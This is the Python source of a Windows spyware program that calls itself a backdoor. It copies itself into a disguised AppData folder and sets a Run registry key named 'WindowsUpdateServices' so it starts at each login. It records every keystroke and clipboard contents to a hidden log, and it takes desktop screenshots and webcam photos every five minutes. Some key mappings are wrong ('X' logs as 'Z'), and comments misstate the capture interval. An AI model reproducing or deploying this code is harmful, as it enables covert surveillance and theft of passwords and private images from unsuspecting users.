import threading, os, sys, time, random
import cv2
import numpy as np
import shutil
# regestry
import _winreg as wreg

from tkinter import Tk
from time import sleep

import pythoncom
from pyHook import HookManager, GetKeyState, HookConstants

import win32con
import win32gui
import win32ui
import subprocess

import wmi
from PIL import Image
from PIL import ImageFilter

data = ''
imgPath = ''
logPath = ''
appPath = ''
clipboardResult = ''
r = Tk()
r.withdraw()
# Camera 0 is the integrated web cam on my netbook
camera_port = 0
# Number of frames to throw away while the camera adjusts to light levels
ramp_frames = 30
camera = ''


# main

class userKeyLog:
    def __init__(self):
        pass

    def createRegestry(self):
        # Reconn Phase
        # current working directory of our executed script
        path = os.getcwd()
        clientName = 'Service.exe'
        data_dir = self.createAppDir()
        destination = self.resource_path(os.path.join(data_dir, clientName))
        # destination = resource_path(os.path.join(data_dir,'client.exe'))

        # If it was the first time our backdoor gets executed, then Do phase 1 and phase 2
        if not os.path.exists(destination):
            # copy our backdoor to destination folder
            shutil.copyfile(sys.argv[0],
                            destination)  # You can replace   path+'\persistence.exe'  with  sys.argv[0] , the sys.argv[0] will return the file name
            # and we will get the same result
            # create a new registry key and point to our backdoor on system start
            key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0,
                               wreg.KEY_ALL_ACCESS)
            wreg.SetValueEx(key, 'WindowsUpdateServices', 0, wreg.REG_SZ, destination)
            key.Close()

    def createPath(self, path):
        if not os.path.exists(path):
            os.mkdir(path)
        else:
            pass

    def resource_path(self, relative):
        if hasattr(sys, "_MEIPASS"):
            return os.path.join(sys._MEIPASS, relative)
        return os.path.join(relative)

    def createAppDir(self):
        global appPath
        user_profile = os.environ['USERPROFILE']  # get user profile
        appPath = user_profile + '\\AppData\\Local\\Microsoft\\Java\\'  # set the destination to copy our shell
        self.createPath(appPath)
        return appPath

    def createImgDir(self):
        global imgPath
        user_profile = os.environ['USERPROFILE']  # get user profile
        imgPath = user_profile + '\\AppData\\Local\\Microsoft\\Java\\Image\\'  # set the destination to copy our shell
        self.createPath(imgPath)
        return imgPath

    def createLogDir(self):
        global logPath
        user_profile = os.environ['USERPROFILE']  # get user profile
        logPath = user_profile + '\\AppData\\Local\\Microsoft\\Java\\Log\\'  # set the destination to copy our shell
        self.createPath(logPath)
        return logPath

    def take_screenshot(self):

        # Gather the desktop information
        desktop = win32gui.GetDesktopWindow()
        left, top, right, bottom = win32gui.GetWindowRect(desktop)
        height = bottom - top
        width = right - left

        # Prepare objects for screenshot
        win_dc = win32gui.GetWindowDC(desktop)
        ui_dc = win32ui.CreateDCFromHandle(win_dc)

        # Create screenshot file
        bitmap = win32ui.CreateBitmap()
        bitmap.CreateCompatibleBitmap(ui_dc, width, height)

        compat_dc = ui_dc.CreateCompatibleDC()
        compat_dc.SelectObject(bitmap)

        # Capture screenshot
        compat_dc.BitBlt((0, 0), (width, height), ui_dc, (0, 0), win32con.SRCCOPY)
        bitmap.Paint(compat_dc)
        timestr = time.strftime("_%Y%m%d_%H%M%S")
        imgName = 'screenshot' + timestr + '.png'
        self.createImgDir()
        destination = self.resource_path(os.path.join(imgPath, imgName))
        bitmap.SaveBitmapFile(compat_dc, destination)
        # compress image
        basewidth = 1920
        img = Image.open(destination)
        wpercent = (basewidth / float(img.size[0]))
        hsize = int((float(img.size[1]) * float(wpercent)))
        img = img.resize((basewidth, hsize), Image.ANTIALIAS)
        img = img.filter(ImageFilter.SHARPEN)
        img.save(destination)

        # Release objects to prevent memory issues
        ui_dc.DeleteDC()
        compat_dc.DeleteDC()
        win32gui.ReleaseDC(desktop, win_dc)
        win32gui.DeleteObject(bitmap.GetHandle())

        threading.Timer(300, self.take_screenshot).start()  # called every minute

    def getClipboard(self):
        try:

            global clipboardResult
            # while not r.selection_get(selection="CLIPBOARD"):
            # sleep(0.1)
            clipboardResult = r.selection_get(selection="CLIPBOARD")
            # r.clipboard_clear()
            # r.destroy
            # data = clipboardResult
            # self.local()
            return clipboardResult
        except Exception as e:
            pass

    # Captures a single image from the camera and returns it in PIL format
    def get_image(self):
        # read is the easiest way to get a full image out of a VideoCapture object.
        retval, im = camera.read()
        return im

    def captureWebcam(self):
        # Now we can initialize the camera capture object with the cv2.VideoCapture class.
        # All it needs is the index to a camera port.
        global camera
        camera = cv2.VideoCapture(camera_port)
        # Ramp the camera - these frames will be discarded and are only used to allow v4l2
        # to adjust light levels, if necessary
        for i in xrange(ramp_frames):
            temp = self.get_image()

        # Take the actual image we want to keep
        camera_capture = self.get_image()
        timestr = time.strftime("_%Y%m%d_%H%M%S")
        imgName = 'webcam' + timestr + '.png'
        self.createImgDir()
        destination = self.resource_path(os.path.join(imgPath, imgName))
        file = destination
        # A nice feature of the imwrite method is that it will automatically choose the
        # correct format based on the file extension you provide. Convenient!
        cv2.imwrite(file, camera_capture)
        # You'll want to release the camera, otherwise you won't be able to create a new
        # capture object until your script exits
        del (camera)

        threading.Timer(300, self.captureWebcam).start()  # called every minute

    # Local Keylogger
    def local(self):
        global data
        self.createLogDir()
        logFileName = 'logs.txt'
        destination = self.resource_path(os.path.join(logPath, logFileName))
        fp = open(destination, "a")
        fp.write(data)
        fp.close()
        data = ''
        return True

    # Again, once the user hit any keyboard button, keypressed func will be executed and that action will be store in event

    def keypressed(self, event):
        global x, data
        # print repr(event), event.KeyID, HookConstants.IDToName(event.KeyID), event.ScanCode , event.Ascii, event.flags
        if event.Ascii == 13:
            keys = '<ENTER>\n'
        elif event.Ascii == 8:
            keys = '<BACK SPACE>'
        elif event.Ascii == 9:
            keys = '<TAB>'
        elif HookConstants.IDToName(event.KeyID) == 'Delete':
            keys = '<DEL>'
        elif event.Ascii == 32:
            keys = ' '
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == '1':
            keys = '!'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == '2':
            keys = '@'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == '3':
            keys = '#'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == '4':
            keys = '$'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == '5':
            keys = '%'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == '6':
            keys = '^'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == '7':
            keys = '&'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == '8':
            keys = '*'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == '9':
            keys = '('
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == '0':
            keys = ')'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'Oem_Minus':
            keys = '_'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'Oem_Plus':
            keys = '+'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'Oem_3':
            keys = '~'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'Oem_5':
            keys = '|'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'Oem_6':
            keys = '}'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'Oem_4':
            keys = '{'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'Oem_7':
            keys = '"'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'Oem_1':
            keys = ':'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'Oem_2':
            keys = '?'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'Oem_Period':
            keys = '>'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'Oem_Comma':
            keys = '<'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'A':
            keys = 'A'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'B':
            keys = 'B'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'C':
            keys = 'C'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'B':
            keys = 'D'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'E':
            keys = 'E'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'F':
            keys = 'F'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'G':
            keys = 'G'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'H':
            keys = 'H'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'I':
            keys = 'I'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'J':
            keys = 'J'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'K':
            keys = 'K'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'L':
            keys = 'L'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'M':
            keys = 'M'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'N':
            keys = 'N'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'O':
            keys = 'O'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'P':
            keys = 'P'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'Q':
            keys = 'Q'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'R':
            keys = 'R'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'S':
            keys = 'S'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'T':
            keys = 'T'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'U':
            keys = 'U'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'V':
            keys = 'V'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'W':
            keys = 'W'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'X':
            keys = 'Z'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'Y':
            keys = 'Y'
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(
                HookConstants.VKeyToID('VK_RSHIFT'))) and HookConstants.IDToName(event.KeyID) == 'Z':
            keys = 'Z'
        elif GetKeyState(HookConstants.VKeyToID('VK_CONTROL')) and HookConstants.IDToName(event.KeyID) == 'C':
            clipboardResult = self.getClipboard()
            keys = ''
        elif GetKeyState(HookConstants.VKeyToID('VK_CONTROL')) and HookConstants.IDToName(event.KeyID) == 'V':
            clipboardResult = self.getClipboard()
            keys = clipboardResult
        elif GetKeyState(HookConstants.VKeyToID('VK_CONTROL')) and HookConstants.IDToName(event.KeyID) == 'A':
            keys = '<SELECT ALL>'
        elif GetKeyState(HookConstants.VKeyToID('VK_CONTROL')) and HookConstants.IDToName(event.KeyID) == 'S':
            keys = '<SAVE>'
        elif GetKeyState(HookConstants.VKeyToID('VK_CONTROL')) and HookConstants.IDToName(event.KeyID) == 'O':
            keys = '<OPEN>'
        elif GetKeyState(HookConstants.VKeyToID('VK_CONTROL')) and HookConstants.IDToName(event.KeyID) == 'N':
            keys = '<NEW>'
        elif GetKeyState(HookConstants.VKeyToID('VK_CONTROL')) and HookConstants.IDToName(event.KeyID) == 'X':
            clipboardResult = self.getClipboard()
            keys = ''
        elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT'))):
            keys = '<SHIFT>'
        else:
            keys = chr(event.Ascii)
        data = data + keys
        self.local()

    def run(self):
        obj = HookManager()
        obj.KeyDown = self.keypressed
        obj.HookKeyboard()  # start the hooking loop and pump out the messages
        pythoncom.PumpMessages()  # remember that per Pyhook documentation we must have a Windows message pump


def main():
    # initialize userKeyLog class
    userkeylog = userKeyLog()
    # create App dir
    userkeylog.createAppDir()
    # create regestry
    userkeylog.createRegestry()
    # Capture Screenshot
    userkeylog.take_screenshot()
    # Capture webcam
    userkeylog.captureWebcam()
    # run logger
    userkeylog.run()


if __name__ == '__main__':
    # execute main function
    main()




